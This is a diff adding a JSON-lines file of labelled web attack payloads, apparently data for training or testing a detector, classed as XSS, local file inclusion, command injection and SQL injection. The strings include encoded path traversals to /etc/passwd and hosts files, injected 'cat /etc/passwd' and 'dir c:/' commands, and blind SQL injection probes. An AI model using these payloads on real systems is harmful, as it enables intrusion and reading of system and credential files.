@@ -1,0 +1,34 @@
+{"value": "write(1) autofocus><input autofocus>", "id": 46, "cls": "xss"}
+{"value": "..../0x5c..../0x5c..../0x5c..../0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts", "id": 3, "cls": "lfi"}
+{"value": "\"`false`\"", "id": 18, "cls": "rce"}
+{"value": "(select * from generate_series(3906,3906,case when (3906=3906) then 1 else 0 end) limit 1)", "id": 32, "cls": "sqli"}
+{"value": "y=<a>confirm</a>;content[y](123)", "id": 47, "cls": "xss"}
+{"value": ".?%u2215etc%u2215passwd", "id": 4, "cls": "lfi"}
+{"value": "`false`", "id": 19, "cls": "rce"}
+{"value": "1;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--", "id": 33, "cls": "sqli"}
+{"value": "<Input value = \"XSS\" type = text>", "id": 48, "cls": "xss"}
+{"value": "..../%u2215..../%u2215..../%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts", "id": 5, "cls": "lfi"}
+{"value": "+|+dir+c:/", "id": 20, "cls": "rce"}
+{"value": "select session_user;", "id": 34, "cls": "sqli"}
+{"value": "..../0x2f..../0x2f..../0x2f..../0x2f..../0x2fetc0x2fissue", "id": 6, "cls": "lfi"}
+{"value": ";+$u+cat+/etc$u/passwd$u", "id": 21, "cls": "rce"}
+{"value": "(select * from generate_series(4990,4990,case when (4990=5065) then 1 else 0 end) limit 1)", "id": 35, "cls": "sqli"}
+{"value": "web-inf/web.xml", "id": 7, "cls": "lfi"}
+{"value": "dir+c:\",7,cmdi,anom ||+dir|c:\"", "id": 22, "cls": "rce"}
+{"value": " HAVING 1=1#", "id": 36, "cls": "sqli"}
+{"value": "0x2e0x2e0x2fetc0x2fissue", "id": 8, "cls": "lfi"}
+{"value": "$+|+dir+c:/", "id": 23, "cls": "rce"}
+{"value": "1',(select * from generate_series(2636,2636,case when (2636=7071) then 1 else 0 end) limit 1)", "id": 37, "cls": "sqli"}
+{"value": "??%uEFC8etc%uEFC8passwd", "id": 9, "cls": "lfi"}
+{"value": "select @@servername", "id": 38, "cls": "sqli"}
+{"value": "..../%uF025..../%uF025..../%uF025..../%uF025etc%uF025passwd", "id": 0, "cls": "lfi"}
+{"value": "\"`true`\"", "id": 15, "cls": "rce"}
+{"value": "1,(select * from generate_series(5609,5609,case when (5609=5609) then 1 else 0 end) limit 1)", "id": 29, "cls": "sqli"}
+{"value": "<a href=\"http://server.com/\">crosssitescripting</a>", "id": 44, "cls": "xss"}
+{"value": "..../0x2f..../0x2f..../0x2f..../0x2fetc0x2fissue", "id": 1, "cls": "lfi"}
+{"value": "&&+|+dir c:/", "id": 16, "cls": "rce"}
+{"value": " OR 1=0", "id": 30, "cls": "sqli"}
+{"value": "<a href=\"http://www.google.com\">crosssitescripting</a>", "id": 45, "cls": "xss"}
+{"value": "..../%u2216..../%u2216..../%u2216..../%u2216etc%u2216issue", "id": 2, "cls": "lfi"}
+{"value": "+|+dir+c:+|", "id": 17, "cls": "rce"}
+{"value": " AND 1=0", "id": 31, "cls": "sqli"}
